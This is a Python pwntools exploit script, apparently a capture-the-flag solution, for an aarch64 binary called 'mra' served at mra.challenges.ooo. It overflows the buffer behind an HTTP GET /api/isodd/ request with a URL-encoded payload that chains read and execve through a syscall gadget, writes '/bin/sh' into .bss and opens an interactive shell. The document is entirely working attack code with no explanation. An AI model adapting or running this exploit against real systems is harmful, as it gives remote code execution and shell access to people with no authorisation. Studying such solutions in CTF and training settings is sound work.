#!/usr/bin/env python3

from pwn import *
import urllib.parse

binary = context.binary = ELF('./mra')

'''
  4007b4:       f85f83e8        ldur    x8, [sp, #-8]
  4007b8:       f85f03e0        ldur    x0, [sp, #-16]
  4007bc:       f85e83e1        ldur    x1, [sp, #-24]
  4007c0:       f85e03e2        ldur    x2, [sp, #-32]
  4007c4:       d4000001        svc     #0x0
'''

binary.symbols['syscall'] = 0x4007b4

if args.REMOTE:
	p = remote('mra.challenges.ooo', 8000)
else:
	if args.GDB:
		p = process(('qemu-'+context.arch+' -g 9000 -L /usr/'+context.arch+'-linux-gnu '+binary.path).split())
	else:
		p = process(('qemu-'+context.arch+' -L /usr/'+context.arch+'-linux-gnu '+binary.path).split())

shell = b'/bin/sh\0'

payload  = b''
payload += b'GET /api/isodd/'
payload += b'%\0'
payload += 40 * b'A'

urlload  = b''
urlload += p64(0)
urlload += p64(0)
urlload += p64(binary.bss())
urlload += p64(constants.SYS_execve)
urlload += p64(len(shell))
urlload += p64(binary.bss())
urlload += p64(0)
urlload += p64(constants.SYS_read)
urlload += 8 * b'A'
urlload += p64(binary.sym.syscall)

payload += urllib.parse.quote(urlload).encode()
payload += (0x3ff - len(payload)) * b'A'

p.send(payload)
p.send(shell)
p.interactive()

